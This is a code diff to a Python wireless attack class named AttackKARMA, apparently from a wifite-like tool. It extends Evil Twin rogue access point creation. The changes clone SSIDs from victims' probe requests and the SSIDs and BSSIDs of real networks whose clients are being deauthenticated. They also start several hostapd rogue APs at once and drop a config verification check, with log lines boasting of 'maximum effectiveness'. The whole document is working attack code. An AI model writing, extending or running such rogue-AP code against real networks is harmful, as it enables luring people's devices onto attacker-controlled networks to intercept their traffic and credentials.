@@ -3131,9 +3131,9 @@ class AttackKARMA(Attack):
             return False
     
     def _create_pnl_based_configs(self):
-        """Create Evil Twin configs based on probe requests (PNL) - OLD CODE APPROACH"""
+        """Create Evil Twin configs based on probe requests (PNL) + real networks - HYBRID APPROACH"""
         try:
-            Color.pl('{+} {G}Creating Evil Twins from probe requests - this is why old code worked!{W}')
+            Color.pl('{+} {G}Creating Evil Twins from probe requests + real networks - HYBRID APPROACH!{W}')
             
             # Get a good channel (use target channel or default)
             target_channel = 6  # Default channel
@@ -3144,33 +3144,54 @@ class AttackKARMA(Attack):
             
             Color.pl('{+} {C}Using channel {G}%d{W} for Evil Twins{W}' % target_channel)
             
-            # Create configs for PNL SSIDs
+            # Create configs for BOTH PNL SSIDs AND real networks
             self.hostapd_configs = []
             created_count = 0
             
+            # Step 1: Create Evil Twins for PNL SSIDs (from probe requests)
+            Color.pl('{+} {C}Step 1: Creating Evil Twins from probe requests (PNL)...{W}')
             for ssid in list(self.pnl_networks):
                 if ssid and ssid != '<MISSING>' and ssid.strip() and len(ssid) <= 32:
                     config = self.create_single_hostapd_config(ssid, target_channel, None)
                     if config:
                         self.hostapd_configs.append(config)
                         created_count += 1
-                        Color.pl('{+} {G}Created Evil Twin: {C}%s{W}' % ssid)
+                        Color.pl('{+} {G}Created PNL Evil Twin: {C}%s{W}' % ssid)
                         
-                        # Limit to 5 Evil Twins to avoid overwhelming
-                        if created_count >= 5:
+                        # Limit to 3 PNL Evil Twins
+                        if created_count >= 3:
                             break
+            
+            # Step 2: Create Evil Twins for real networks with clients (CRITICAL FIX!)
+            Color.pl('{+} {C}Step 2: Creating Evil Twins for real networks being deauthed...{W}')
+            if hasattr(self, 'real_networks') and self.real_networks:
+                for network in self.real_networks:
+                    if network.clients and network.essid_known and network.essid:
+                        # Use the network's actual channel for better compatibility
+                        network_channel = int(network.channel) if network.channel else target_channel
+                        
+                        config = self.create_single_hostapd_config(network.essid, network_channel, network.bssid)
+                        if config:
+                            self.hostapd_configs.append(config)
+                            created_count += 1
+                            Color.pl('{+} {G}Created Real Network Evil Twin: {C}%s{W} (Channel {C}%d{W})' % (network.essid, network_channel))
+                            
+                            # Limit to 5 total Evil Twins
+                            if created_count >= 5:
+                                break
             
             if created_count > 0:
                 self.hostapd_config = self.hostapd_configs[0]  # Set primary config
-                Color.pl('{+} {G}Successfully created {C}%d{W} Evil Twins from probe requests{W}' % created_count)
-                Color.pl('{+} {G}Clients will now connect to familiar SSIDs from their PNL!{W}')
+                Color.pl('{+} {G}Successfully created {C}%d{W} Evil Twins total{W}' % created_count)
+                Color.pl('{+} {G}Hybrid approach: PNL SSIDs + Real Network SSIDs = Maximum effectiveness!{W}')
+                Color.pl('{+} {G}Clients will connect to familiar SSIDs from their PNL OR their current networks!{W}')
                 return True
             else:
-                Color.pl('{!} {R}Failed to create any Evil Twin configs from PNL{W}')
+                Color.pl('{!} {R}Failed to create any Evil Twin configs{W}')
                 return False
                 
         except Exception as e:
-            Color.pl('{!} {R}Error creating PNL-based configs: {O}%s{W}' % str(e))
+            Color.pl('{!} {R}Error creating hybrid Evil Twin configs: {O}%s{W}' % str(e))
             return False
     
     def _create_target_based_configs(self, target_network):
@@ -3637,19 +3658,15 @@ server=8.8.8.8
             return True  # Allow to proceed even if verification fails
 
     def start_rogue_ap(self):
-        """Start Evil Twin access point"""
+        """Start Evil Twin access point(s) - supports multiple configurations"""
         try:
             # Check if hostapd config exists
             if not self.hostapd_config:
                 Color.pl('{!} {R}No hostapd configuration found - cannot start Evil Twin{W}')
                 return False
                 
-            # Verify rogue AP config matches real network
-            if not self.verify_rogue_ap_config():
-                Color.pl('{!} {R}Rogue AP config verification failed{W}')
-                return False
-                
-            # Start hostapd
+            # Start primary Evil Twin
+            Color.pl('{+} {C}Starting primary Evil Twin AP...{W}')
             hostapd_cmd = ['hostapd', '-B', self.hostapd_config]
             Color.pl('{+} {C}Starting hostapd with config: {G}%s{W}' % self.hostapd_config)
             
@@ -3665,7 +3682,6 @@ server=8.8.8.8
             if stdout and 'AP-ENABLED' in stdout:
                 Color.pl('{+} {G}Primary Evil Twin started successfully{W}')
                 Color.pl('{+} {G}AP is enabled and ready for connections{W}')
-                return True
             else:
                 Color.pl('{!} {R}Failed to start primary Evil Twin{W}')
                 if stdout:
@@ -3674,50 +3690,56 @@ server=8.8.8.8
                     Color.pl('{!} {O}hostapd error: {R}%s{W}' % stderr.strip())
                 return False
             
+            # Start additional Evil Twins if we have multiple configs
+            if hasattr(self, 'hostapd_configs') and len(self.hostapd_configs) > 1:
+                Color.pl('{+} {C}Starting additional Evil Twin APs...{W}')
+                self.start_additional_evil_twins()
+            
+            return True
+            
         except Exception as e:
             Color.pl('{!} {R}Failed to start Evil Twin: {O}%s{W}' % str(e))
             return False
     
     def start_additional_evil_twins(self):
-        """Start additional Evil Twin access points on multiple interfaces"""
+        """Start additional Evil Twin access points - supports multiple SSIDs on same interface"""
         try:
-            if not self.additional_interfaces:
-                Color.pl('{!} {O}No additional interfaces available for multiple APs{W}')
+            # Check if we have multiple hostapd configs
+            if not hasattr(self, 'hostapd_configs') or len(self.hostapd_configs) <= 1:
+                Color.pl('{!} {O}No additional Evil Twin configs available{W}')
                 return
             
             self.additional_processes = []
             
-            Color.pl('{+} {C}Starting additional Evil Twin APs on multiple interfaces...{W}')
+            Color.pl('{+} {C}Starting additional Evil Twin APs with different SSIDs...{W}')
             
-            for i, interface in enumerate(self.additional_interfaces[:3], 1):  # Limit to 3 additional APs
+            # Start additional Evil Twins using the additional configs
+            for i, config_file in enumerate(self.hostapd_configs[1:], 1):  # Skip first config (already started)
                 try:
-                    # Create config for this interface
-                    config_file = self.create_interface_specific_config(self.hostapd_config, interface)
+                    cmd = ['hostapd', '-B', config_file]
+                    Color.pl('{+} {C}Starting Evil Twin {C}%d{W} with config: {G}%s{W}...' % (i, config_file))
                     
-                    if config_file:
-                        # Modify SSID to be unique for this interface
-                        modified_config = self.create_unique_ssid_config(config_file, interface, i)
+                    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+                    
+                    time.sleep(2)  # Give it time to start
+                    
+                    # Check if process is still running
+                    if process.poll() is None:
+                        self.additional_processes.append(process)
+                        Color.pl('{+} {G}Evil Twin {C}%d{W} started successfully{W}' % i)
                         
-                        if modified_config:
-                            cmd = ['hostapd', '-B', modified_config]
-                            Color.pl('{+} {C}Starting Evil Twin {C}%d{W} on interface {G}%s{W}...' % (i, interface))
-                            
-                            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-                            
-                            time.sleep(2)  # Give it time to start
-                            
-                            if process.poll() is None:
-                                self.additional_processes.append(process)
-                                Color.pl('{+} {G}Evil Twin {C}%d{W} started successfully on {G}%s{W}' % (i, interface))
-                                
-                                # GUI logging
-                                if hasattr(self, 'target') and self.target:
-                                    Color.pattack('KARMA', self.target, 'Multi-AP', f'Started AP {i} on {interface}')
-                            else:
-                                stdout, stderr = process.communicate()
-                                Color.pl('{!} {R}Failed to start Evil Twin {C}%d{W} on {G}%s{W}' % (i, interface))
-                                if stderr:
-                                    Color.pl('{!} {O}Error: {R}%s{W}' % stderr.strip()[:100])
+                        # GUI logging
+                        if hasattr(self, 'target') and self.target:
+                            Color.pattack('KARMA', self.target, 'Multi-AP', f'Started additional AP {i}')
+                    else:
+                        stdout, stderr = process.communicate()
+                        Color.pl('{!} {R}Failed to start Evil Twin {C}%d{W}' % i)
+                        if stderr:
+                            Color.pl('{!} {O}Error: {R}%s{W}' % stderr.strip()[:100])
+                    
+                    # Limit to 4 total Evil Twins to avoid overwhelming
+                    if len(self.additional_processes) >= 3:
+                        break
                         
                 except Exception as e:
                     Color.pl('{!} {R}Error starting Evil Twin {C}%d{W}: {O}%s{W}' % (i, str(e)))
@@ -3725,6 +3747,7 @@ server=8.8.8.8
             if self.additional_processes:
                 Color.pl('{+} {G}Successfully started {C}%d{W} additional Evil Twin APs{W}' % len(self.additional_processes))
                 Color.pl('{+} {C}Total Evil Twin APs running: {G}%d{W}' % (len(self.additional_processes) + 1))
+                Color.pl('{+} {G}Multiple SSIDs available for maximum client connection success!{W}')
             else:
                 Color.pl('{!} {O}No additional Evil Twin APs could be started{W}')
             
